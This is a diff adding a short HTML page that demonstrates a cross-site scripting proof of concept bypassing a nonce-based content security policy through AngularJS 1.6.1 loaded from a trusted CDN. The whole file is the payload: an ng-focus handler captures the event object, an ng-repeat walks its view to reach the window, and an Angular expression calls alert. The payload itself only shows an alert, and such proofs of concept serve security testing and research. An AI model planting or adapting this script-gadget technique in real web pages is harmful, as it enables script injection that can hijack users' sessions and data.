@@ -1,0 +1,15 @@
+<html>
+  <head>
+    <meta http-equiv=content-security-policy content="object-src 'none';script-src 'nonce-secret';">
+    <script nonce=secret src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
+  </head>
+  <body ng-app>
+     xss xss xss</body>
+    <div ng-app ng-csp>
+    <div ng-focus="x=$event;" id=f tabindex=0>foo</div>
+    <div ng-repeat="(key, value) in x.view">
+      <div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1337); }}</div>
+    </div>
+  </div>
+  </body>
+</html>
